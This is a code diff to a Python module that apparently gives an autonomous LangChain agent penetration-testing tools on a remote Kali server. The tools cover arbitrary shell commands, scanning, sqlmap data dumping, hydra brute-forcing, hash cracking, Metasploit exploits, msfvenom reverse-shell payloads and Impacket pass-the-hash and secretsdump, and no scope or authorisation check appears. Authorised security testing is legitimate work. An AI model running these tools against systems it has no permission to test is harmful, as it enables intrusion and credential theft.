@@ -1,33 +1,30 @@
 """LangChain tools that call the Kali FastAPI server directly over httpx.
 
-Replaces the MCP transport layer entirely — no SSE, no session state, no
-reconnection logic. Each tool is a plain async function wrapped with
-@tool. Timeouts are enforced by httpx.
+Each tool is a plain async function wrapped with @tool.
+Timeouts are enforced by httpx; the agent never sees timeout params.
 """
 
 import logging
 from typing import Any
 
 import httpx
-from langchain_core.tools import tool
+from langchain.tools import tool
 
 from config import settings
 
 logger = logging.getLogger("agent.tools")
 
 _BASE_URL = "http://192.168.50.21:3000"
-_TIMEOUT = settings.agent.tool_timeout
+_DEFAULT_TIMEOUT = 300
+_HARD_LIMIT_TIMEOUT = 3600
+_TIMEOUT = getattr(settings.agent, "tool_timeout", _DEFAULT_TIMEOUT)
 
 
-def _client() -> httpx.AsyncClient:
-    return httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT)
-
-
-def _fmt(result: dict[str, Any]) -> str:
+def _fmt(result: dict[str, Any], timeout: int = _TIMEOUT) -> str:
     """Format the API response into a readable string for the agent."""
     parts = []
     if result.get("timed_out"):
-        parts.append(f"[TIMED OUT after {_TIMEOUT}s — partial results below]")
+        parts.append(f"[TIMED OUT after {timeout}s — partial results below]")
     if result.get("stdout"):
         parts.append(result["stdout"])
     if result.get("stderr"):
@@ -39,16 +36,21 @@ def _fmt(result: dict[str, Any]) -> str:
 
 
 async def _api_post(endpoint: str, payload: dict[str, Any]) -> str:
-    """POST to the Kali API and return a formatted string result.
-    All HTTP and network errors are caught and returned as error strings
-    so the agent can reason about failures instead of crashing."""
+    """POST to the Kali API and return a formatted string result."""
+    actual_timeout = _TIMEOUT
+    if actual_timeout > _HARD_LIMIT_TIMEOUT:
+        actual_timeout = _HARD_LIMIT_TIMEOUT
+
+    payload["timeout"] = actual_timeout
+    httpx_timeout = actual_timeout + 10
+
     try:
-        async with _client() as c:
+        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=httpx_timeout) as c:
             r = await c.post(endpoint, json=payload)
             r.raise_for_status()
-            return _fmt(r.json())
+            return _fmt(r.json(), timeout=actual_timeout)
     except httpx.TimeoutException:
-        msg = f"TOOL TIMEOUT: {endpoint} did not respond within {_TIMEOUT}s. Try a different approach or move to the next candidate."
+        msg = f"TOOL TIMEOUT: {endpoint} did not respond within {httpx_timeout}s. Try a different approach."
         logger.warning(msg)
         return msg
     except httpx.ConnectError:
@@ -66,302 +68,166 @@ async def _api_post(endpoint: str, payload: dict[str, Any]) -> str:
 
 
 # ──────────────────────────────────────────────────────────────────────
-# Recon Tools  (kali-api: routers/recon.py — prefix /api/tools)
+# Recon Tools
 # ──────────────────────────────────────────────────────────────────────
 
+
 @tool
-async def run_command(command: str) -> str:
-    """Run an arbitrary non-interactive shell command on the Kali machine.
-    Only use for commands that exit on their own (curl, dig, whois, etc.).
-    Never use nc, netcat, or anything that opens an interactive session."""
+async def kali_command(command: str) -> str:
+    """Run a shell command on the remote Kali machine. Only for non-interactive commands that exit on their own (curl, dig, whois). Never use with nc/netcat."""
     return await _api_post("/api/tools/command", {"command": command})
 
 
 @tool
-async def nmap(
-    target: str,
-    scan_type: str = "-sCV",
-    ports: str = "",
-    additional_args: str = "-T4 -Pn",
-) -> str:
-    """Run an nmap scan against a target.
-    scan_type: nmap flags e.g. '-sCV', '-sU', '-sS'.
-    ports: port range e.g. '1-500', '80,443', '' for default.
-    additional_args: extra nmap flags."""
-    return await _api_post(
-        "/api/tools/nmap",
-        {"target": target, "scan_type": scan_type, "ports": ports, "additional_args": additional_args},
-    )
+async def nmap(target: str, scan_type: str = "-sCV", ports: str = "", additional_args: str = "-T4 -Pn") -> str:
+    """Port scan and service detection. Example: nmap(target="10.0.0.1", ports="1-1000"). Use -sCV for version detection, -sU for UDP, -O for OS fingerprint."""
+    return await _api_post("/api/tools/nmap", {"target": target, "scan_type": scan_type, "ports": ports, "additional_args": additional_args})
 
 
 @tool
 async def masscan(target: str, ports: str = "0-65535", rate: int = 1000, additional_args: str = "") -> str:
-    """Fast port discovery across large port ranges. Use before nmap to find open ports quickly,
-    then run nmap -sCV only against the discovered ports.
-    rate: packets/sec — keep ≤1000 on shared networks to avoid drops."""
+    """Fast port discovery across large ranges. Use this first, then nmap -sCV on found ports. Keep rate <= 1000."""
     return await _api_post("/api/tools/masscan", {"target": target, "ports": ports, "rate": rate, "additional_args": additional_args})
 
 
 @tool
 async def searchsploit(query: str, additional_args: str = "") -> str:
-    """Search ExploitDB for known public exploits matching a service name or version string.
-    query: e.g. 'vsftpd 2.3.4', 'Apache 2.2', 'Samba 3.0.20', 'ProFTPD 1.3.1'"""
+    """Search ExploitDB for public exploits. Query with service and version, e.g. 'vsftpd 2.3.4' or 'Apache 2.2'."""
     return await _api_post("/api/tools/searchsploit", {"query": query, "additional_args": additional_args})
 
 
 @tool
 async def whatweb(target: str, aggression: int = 1, additional_args: str = "") -> str:
-    """Fingerprint web technologies, CMS, JavaScript frameworks, and server headers.
-    aggression: 1=passive/stealthy, 3=aggressive (more requests), 4=heavy."""
+    """Fingerprint web technologies (server, CMS, frameworks). Set aggression=3 for thorough detection."""
     return await _api_post("/api/tools/whatweb", {"target": target, "aggression": aggression, "additional_args": additional_args})
 
 
 @tool
 async def sslscan(target: str, additional_args: str = "") -> str:
-    """Scan SSL/TLS configuration for weak ciphers, expired certificates, and known vulnerabilities
-    (POODLE, Heartbleed, BEAST, CRIME). target: host or host:port."""
+    """Check SSL/TLS for weak ciphers and vulnerabilities (Heartbleed, POODLE). Target: host or host:port."""
     return await _api_post("/api/tools/sslscan", {"target": target, "additional_args": additional_args})
 
 
 # ──────────────────────────────────────────────────────────────────────
-# Web Tools  (kali-api: routers/web.py — prefix /api/tools)
+# Web Tools
 # ──────────────────────────────────────────────────────────────────────
 
+
 @tool
-async def gobuster(
-    url: str,
-    mode: str = "dir",
-    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
-    additional_args: str = "",
-) -> str:
-    """Run gobuster directory/DNS/vhost brute-forcing against a URL.
-    mode: 'dir', 'dns', 'fuzz', or 'vhost'."""
-    return await _api_post(
-        "/api/tools/gobuster",
-        {"url": url, "mode": mode, "wordlist": wordlist, "additional_args": additional_args},
-    )
+async def gobuster(url: str, mode: str = "dir", wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> str:
+    """Brute-force directories and files on a web server. Faster than dirb. Mode: 'dir', 'dns', or 'vhost'."""
+    return await _api_post("/api/tools/gobuster", {"url": url, "mode": mode, "wordlist": wordlist, "additional_args": additional_args})
 
 
 @tool
-async def dirb(
-    url: str,
-    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
-    additional_args: str = "",
-) -> str:
-    """Run dirb web content scanner against a URL."""
-    return await _api_post(
-        "/api/tools/dirb",
-        {"url": url, "wordlist": wordlist, "additional_args": additional_args},
-    )
+async def dirb(url: str, wordlist: str = "/usr/share/wordlists/dirb/common.txt", additional_args: str = "") -> str:
+    """Brute-force directories on a web server. Use gobuster instead unless you need recursive scanning."""
+    return await _api_post("/api/tools/dirb", {"url": url, "wordlist": wordlist, "additional_args": additional_args})
 
 
 @tool
 async def nikto(target: str, additional_args: str = "") -> str:
-    """Run nikto web server vulnerability scanner against a target host or URL."""
+    """Scan a web server for misconfigurations, outdated software, and known vulnerabilities. Target: URL or host."""
     return await _api_post("/api/tools/nikto", {"target": target, "additional_args": additional_args})
 
 
 @tool
 async def sqlmap(url: str, data: str = "", additional_args: str = "") -> str:
-    """Run sqlmap SQL injection scanner against a URL.
-    data: POST body string for POST requests."""
+    """Test a URL for SQL injection and dump data if vulnerable. Set data for POST requests (e.g. 'user=admin&pass=test')."""
     return await _api_post("/api/tools/sqlmap", {"url": url, "data": data, "additional_args": additional_args})
 
 
 @tool
 async def wpscan(url: str, additional_args: str = "") -> str:
-    """Run WPScan WordPress vulnerability scanner against a URL."""
+    """Scan a WordPress site for vulnerable plugins, themes, and users."""
     return await _api_post("/api/tools/wpscan", {"url": url, "additional_args": additional_args})
 
 
 # ──────────────────────────────────────────────────────────────────────
-# Exploitation Tools  (kali-api: routers/exploitation.py — prefix /api/tools)
+# Exploitation Tools
 # ──────────────────────────────────────────────────────────────────────
+
 
 @tool
 async def metasploit(module: str, options: dict[str, Any] = {}) -> str:
-    """Run a Metasploit module non-interactively.
-    module: full module path e.g. 'exploit/unix/irc/unreal_ircd_3281_backdoor'.
-    options: dict of MSF options e.g. {'RHOSTS': '192.168.1.1', 'LHOST': '192.168.1.2'}.
-    Use this instead of nc/netcat for any exploit that requires a shell connection."""
+    """Run a Metasploit module. Use for exploits and post-exploitation instead of nc/netcat. Example: metasploit(module="exploit/unix/ftp/vsftpd_234_backdoor", options={"RHOSTS": "10.0.0.1"})."""
     return await _api_post("/api/tools/metasploit", {"module": module, "options": options})
 
 
 @tool
-async def msfvenom(
-    payload: str,
-    lhost: str = "",
-    lport: int = 4444,
-    format: str = "elf",
-    output: str = "/tmp/kali-loot/payload",
-    additional_args: str = "",
-) -> str:
-    """Generate a standalone payload with msfvenom, saved to the loot directory.
-    payload: e.g. 'linux/x86/meterpreter/reverse_tcp', 'windows/x64/meterpreter/reverse_tcp'.
-    format: elf (Linux), exe (Windows), py, raw, etc.
-    Returns the path to the generated file."""
-    return await _api_post("/api/tools/msfvenom", {
-        "payload": payload, "lhost": lhost, "lport": lport,
-        "format": format, "output": output, "additional_args": additional_args,
-    })
+async def msfvenom(payload: str, lhost: str = "", lport: int = 4444, format: str = "elf", output: str = "/tmp/kali-loot/payload", additional_args: str = "") -> str:
+    """Generate a payload file. Example: msfvenom(payload="linux/x86/meterpreter/reverse_tcp", lhost="10.0.0.2"). Format: elf=Linux, exe=Windows."""
+    return await _api_post("/api/tools/msfvenom", {"payload": payload, "lhost": lhost, "lport": lport, "format": format, "output": output, "additional_args": additional_args})
 
 
 # ──────────────────────────────────────────────────────────────────────
-# Credential Tools  (kali-api: routers/credentials.py — prefix /api/tools)
+# Credential Tools
 # ──────────────────────────────────────────────────────────────────────
 
+
 @tool
-async def hydra(
-    target: str,
-    service: str,
-    username: str = "",
-    username_file: str = "",
-    password: str = "",
-    password_file: str = "",
-    additional_args: str = "",
-) -> str:
-    """Run hydra credential brute-forcing.
-    service: protocol e.g. 'ssh', 'ftp', 'http-post-form', 'smb'.
-    Provide username or username_file, and password or password_file."""
-    return await _api_post(
-        "/api/tools/hydra",
-        {
-            "target": target,
-            "service": service,
-            "username": username,
-            "username_file": username_file,
-            "password": password,
-            "password_file": password_file,
-            "additional_args": additional_args,
-        },
-    )
+async def hydra(target: str, service: str, username: str = "", username_file: str = "", password: str = "", password_file: str = "", additional_args: str = "") -> str:
+    """Brute-force login credentials. Service: ssh, ftp, http-post-form, smb, etc. Provide username or username_file, and password or password_file."""
+    return await _api_post("/api/tools/hydra", {"target": target, "service": service, "username": username, "username_file": username_file, "password": password, "password_file": password_file, "additional_args": additional_args})
 
 
 @tool
-async def john(
-    hash_file: str,
-    wordlist: str = "/usr/share/wordlists/rockyou.txt",
-    format: str = "",
-    additional_args: str = "",
-) -> str:
-    """Run John the Ripper to crack password hashes.
-    hash_file: path to file containing hashes on the Kali machine.
-    format: hash format e.g. 'md5crypt', 'sha512crypt' (leave empty to auto-detect)."""
-    return await _api_post(
-        "/api/tools/john",
-        {"hash_file": hash_file, "wordlist": wordlist, "format": format, "additional_args": additional_args},
-    )
+async def john(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt", format: str = "", additional_args: str = "") -> str:
+    """Crack password hashes from a file. Auto-detects format, or specify: md5crypt, sha512crypt, etc."""
+    return await _api_post("/api/tools/john", {"hash_file": hash_file, "wordlist": wordlist, "format": format, "additional_args": additional_args})
 
 
 @tool
-async def hashcat(
-    hash_file: str,
-    wordlist: str = "/usr/share/wordlists/rockyou.txt",
-    hash_type: int = 0,
-    attack_mode: int = 0,
-    additional_args: str = "",
-) -> str:
-    """GPU-accelerated password cracking. Faster than john for NTLM and modern hashes.
-    hash_type: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt, 3200=bcrypt.
-    attack_mode: 0=dictionary, 3=brute-force mask."""
-    return await _api_post("/api/tools/hashcat", {
-        "hash_file": hash_file, "wordlist": wordlist,
-        "hash_type": hash_type, "attack_mode": attack_mode, "additional_args": additional_args,
-    })
+async def hashcat(hash_file: str, wordlist: str = "/usr/share/wordlists/rockyou.txt", hash_type: int = 0, attack_mode: int = 0, additional_args: str = "") -> str:
+    """GPU-accelerated hash cracking. hash_type: 0=MD5, 1000=NTLM, 1800=sha512crypt. attack_mode: 0=dictionary, 3=brute-force."""
+    return await _api_post("/api/tools/hashcat", {"hash_file": hash_file, "wordlist": wordlist, "hash_type": hash_type, "attack_mode": attack_mode, "additional_args": additional_args})
 
 
 @tool
-async def crackmapexec(
-    protocol: str,
-    target: str,
-    username: str = "",
-    username_file: str = "",
-    password: str = "",
-    password_file: str = "",
-    additional_args: str = "",
-) -> str:
-    """Validate credentials and enumerate accessible services via netexec (nxc).
-    protocol: smb | ssh | winrm | ldap | rdp | ftp.
-    Use after hydra to confirm working credentials, check share access, or spray passwords.
-    additional_args examples: '--shares' (list SMB shares), '--sam' (dump SAM), '--users'."""
-    return await _api_post("/api/tools/crackmapexec", {
-        "protocol": protocol, "target": target,
-        "username": username, "username_file": username_file,
-        "password": password, "password_file": password_file,
-        "additional_args": additional_args,
-    })
+async def crackmapexec(protocol: str, target: str, username: str = "", username_file: str = "", password: str = "", password_file: str = "", additional_args: str = "") -> str:
+    """Test credentials and enumerate services. Protocol: smb, ssh, winrm, ftp. Use additional_args='--shares' for SMB shares, '--users' for users."""
+    return await _api_post("/api/tools/crackmapexec", {"protocol": protocol, "target": target, "username": username, "username_file": username_file, "password": password, "password_file": password_file, "additional_args": additional_args})
 
 
 # ──────────────────────────────────────────────────────────────────────
-# Post-Exploitation Tools  (kali-api: routers/post_exploit.py — prefix /api/tools)
+# Post-Exploitation Tools
 # ──────────────────────────────────────────────────────────────────────
+
 
 @tool
 async def enum4linux(target: str, additional_args: str = "-a") -> str:
-    """Run enum4linux SMB/NetBIOS enumeration against a target."""
+    """Enumerate SMB/NetBIOS: shares, users, groups, OS info, password policy. Use -a for full enumeration."""
     return await _api_post("/api/tools/enum4linux", {"target": target, "additional_args": additional_args})
 
 
 @tool
-async def smbclient(
-    target: str,
-    share: str,
-    username: str = "",
-    password: str = "",
-    command: str = "ls",
-    additional_args: str = "",
-) -> str:
-    """Access an SMB share and run a single command.
-    command examples: 'ls', 'get filename', 'put localfile remotefile', 'recurse ON; ls'.
-    Leave username/password empty for anonymous access."""
-    return await _api_post("/api/tools/smbclient", {
-        "target": target, "share": share, "username": username,
-        "password": password, "command": command, "additional_args": additional_args,
-    })
+async def smbclient(target: str, share: str, username: str = "", password: str = "", command: str = "ls", additional_args: str = "") -> str:
+    """Connect to an SMB share and run a command. Leave username/password empty for anonymous access. Commands: ls, get, put."""
+    return await _api_post("/api/tools/smbclient", {"target": target, "share": share, "username": username, "password": password, "command": command, "additional_args": additional_args})
 
 
 @tool
-async def impacket(
-    tool: str,
-    target: str,
-    username: str = "",
-    password: str = "",
-    domain: str = "",
-    hash: str = "",
-    additional_args: str = "",
-) -> str:
-    """Run an Impacket tool for Windows/AD attacks.
-    tool: secretsdump | psexec | smbexec | GetNPUsers | GetUserSPNs.
-    hash: NTLM hash for pass-the-hash in LM:NT format (e.g. aad3b435b51404eeaad3b435b51404ee:hash).
-    secretsdump: dumps SAM/NTDS hashes. psexec/smbexec: remote command execution.
-    GetNPUsers: find AS-REP roastable accounts. GetUserSPNs: find Kerberoastable accounts."""
-    return await _api_post("/api/tools/impacket", {
-        "tool": tool, "target": target, "username": username,
-        "password": password, "domain": domain, "hash": hash,
-        "additional_args": additional_args,
-    })
+async def impacket(tool: str, target: str, username: str = "", password: str = "", domain: str = "", hash: str = "", additional_args: str = "") -> str:
+    """Windows/AD attack tools. tool: secretsdump, psexec, smbexec, GetNPUsers, GetUserSPNs. Use hash for pass-the-hash (LM:NT format)."""
+    return await _api_post("/api/tools/impacket", {"tool": tool, "target": target, "username": username, "password": password, "domain": domain, "hash": hash, "additional_args": additional_args})
 
 
 @tool
 async def linpeas(target_os: str = "linux") -> str:
-    """Stage linpeas (Linux) or winpeas (Windows) in the loot directory for upload to a target.
-    Returns the staged file path. Upload to the target with Metasploit:
-      use post/multi/manage/upload; set SESSION <id>; set SRC <path>; set DEST /tmp/; run
-    Then execute: post/multi/manage/shell_to_meterpreter → shell → chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh"""
+    """Stage linpeas/winpeas in the loot directory. Returns the file path. Upload to target via Metasploit post/multi/manage/upload."""
     return await _api_post("/api/tools/linpeas", {"target_os": target_os})
 
 
 # ──────────────────────────────────────────────────────────────────────
-# File Management  (kali-api: routers/files.py — prefix /api/files)
+# Kali File Management
 # ──────────────────────────────────────────────────────────────────────
 
+
 @tool
-async def read_file(path: str) -> str:
-    """Read the content of a file from the Kali machine.
-    path: absolute path (e.g. /root/.msf4/loot/hash.txt) or relative to loot directory.
-    Returns file content as text. Binary files are returned as base64."""
+async def kali_read_file(path: str) -> str:
+    """Read a file on the remote Kali machine. Use for loot, hashes, configs. Path: absolute or relative to loot dir."""
     try:
-        async with _client() as c:
+        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
             r = await c.get("/api/files/read", params={"path": path})
             r.raise_for_status()
             data = r.json()
@@ -375,16 +241,18 @@ async def read_file(path: str) -> str:
 
 
 @tool
-async def list_files(path: str = "") -> str:
-    """List files and directories at a path on the Kali machine.
-    path: absolute path or relative to loot directory (defaults to loot directory root).
-    Useful for browsing Metasploit loot (/root/.msf4/loot/) or captured files."""
+async def kali_list_files(path: str = "") -> str:
+    """List files on the remote Kali machine. Defaults to loot directory. Use to browse Metasploit loot or captured files."""
     try:
-        async with _client() as c:
+        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
             r = await c.get("/api/files/list", params={"path": path})
             r.raise_for_status()
             data = r.json()
-            lines = [f"  {e['type'][0].upper()}  {e['name']}" + (f"  ({e['size']} bytes)" if e["size"] is not None else "") for e in data["entries"]]
+            lines = [
+                f"  {e['type'][0].upper()}  {e['name']}"
+                + (f"  ({e['size']} bytes)" if e["size"] is not None else "")
+                for e in data["entries"]
+            ]
             return f"{data['path']}/\n" + ("\n".join(lines) if lines else "  (empty)")
     except httpx.HTTPStatusError as e:
         return f"TOOL ERROR: HTTP {e.response.status_code} — {e.response.text[:300]}"
@@ -393,19 +261,14 @@ async def list_files(path: str = "") -> str:
 
 
 @tool
-async def upload_file(local_path: str, dest_path: str = "") -> str:
-    """Upload a file from the Kali machine's local filesystem to the loot directory.
-    local_path: absolute path to the file on the Kali machine to read and upload.
-    dest_path: optional subdirectory/filename within the loot directory (e.g. 'wordlists/custom.txt').
-    If dest_path is empty, the original filename is used."""
+async def kali_upload_file(local_path: str, dest_path: str = "") -> str:
+    """Copy a file on the Kali machine into the loot directory. local_path: source file, dest_path: optional destination name."""
     try:
-        async with _client() as c:
-            # Read the file content first, then upload via multipart
+        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
             read_resp = await c.get("/api/files/read", params={"path": local_path})
             read_resp.raise_for_status()
             data = read_resp.json()
             content = data["content"].encode("utf-8")
-
             files = {"file": (local_path.split("/")[-1], content)}
             r = await c.post("/api/files/upload", files=files, data={"path": dest_path} if dest_path else {})
             r.raise_for_status()
@@ -418,12 +281,10 @@ async def upload_file(local_path: str, dest_path: str = "") -> str:
 
 
 @tool
-async def delete_file(path: str) -> str:
-    """Delete a file from the loot directory on the Kali machine.
-    path: relative path within the loot directory.
-    Use for cleanup after extracting sensitive data."""
+async def kali_delete_file(path: str) -> str:
+    """Delete a file from the loot directory on the Kali machine."""
     try:
-        async with _client() as c:
+        async with httpx.AsyncClient(base_url=_BASE_URL, timeout=_TIMEOUT + 5) as c:
             r = await c.request("DELETE", "/api/files", params={"path": path})
             r.raise_for_status()
             result = r.json()
@@ -438,37 +299,32 @@ async def delete_file(path: str) -> str:
 # Tool Registry
 # ──────────────────────────────────────────────────────────────────────
 
+
 def get_tools() -> list:
     return [
-        # Recon  (routers/recon.py)
-        run_command,
+        kali_command,
         nmap,
         masscan,
         searchsploit,
         whatweb,
         sslscan,
-        # Web  (routers/web.py)
         gobuster,
         dirb,
         nikto,
         sqlmap,
         wpscan,
-        # Exploitation  (routers/exploitation.py)
         metasploit,
         msfvenom,
-        # Credentials  (routers/credentials.py)
         hydra,
         john,
         hashcat,
         crackmapexec,
-        # Post-exploitation  (routers/post_exploit.py)
         enum4linux,
         smbclient,
         impacket,
         linpeas,
-        # Files  (routers/files.py)
-        read_file,
-        list_files,
-        upload_file,
-        delete_file,
+        kali_read_file,
+        kali_list_files,
+        kali_upload_file,
+        kali_delete_file,
     ]
